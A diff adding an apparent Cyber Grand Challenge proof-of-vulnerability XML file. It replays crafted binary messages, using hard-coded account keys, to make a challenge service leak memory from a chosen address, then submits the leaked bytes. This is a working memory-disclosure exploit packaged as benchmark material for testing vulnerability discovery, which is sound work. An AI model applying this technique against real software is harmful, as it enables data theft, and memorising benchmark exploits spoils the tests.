@@ -1,0 +1,29 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
+<cfepov>
+<cbid>service</cbid>
+<replay>
+    <negotiate><type2 /></negotiate>
+        <!-- Using sell acct id 0 with key f97adfe8fa275092adf100d06900aed0 -->
+    <write><data>\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\xc5\x277\xc8\x00\x00\x00DDTEK\x00\x00\x00\x22\x7dc\x24\x2ffe8\xaea275092\xa9df1V\x09SQr\x7ddu\x2aed0</data></write>
+    <read><length>24</length><match><data>\x01\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x99\x00\x00\x00</data></match></read>
+    <!-- Using buy acct id 99 with key d97236f062e48047aedd7957122c8238 -->
+    <write><data>\x00\x00\x00\x00\x00\x00\x00\x00c\x00\x00\x00</data></write>
+    <!-- Length of read here -->
+	<write><var>TYPE2_SIZE</var></write>
+    <!-- Read location here -->
+	<write><var>TYPE2_ADDR</var></write>
+    <write><data>\x00\x00\x80?\x0a\x00\x00\x00DDTEK\x00\x00\x00 \x7dcwx6f0\x3c2e4\x5b047\xb1eddS\x00\x02\x05uvf\x26s238</data></write>
+    <read><length>20</length><match><data>\x01\x00\x00\x00\x00\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</data></match></read>
+    <!-- Manual t2 variable reading goes here... -->
+    <read>
+       <length>48</length>
+       <assign>
+          <var>TYPE2_VALUE</var>
+          <slice />
+       </assign>
+    </read>
+    <submit><var>TYPE2_VALUE</var></submit>
+
+</replay>
+</cfepov>
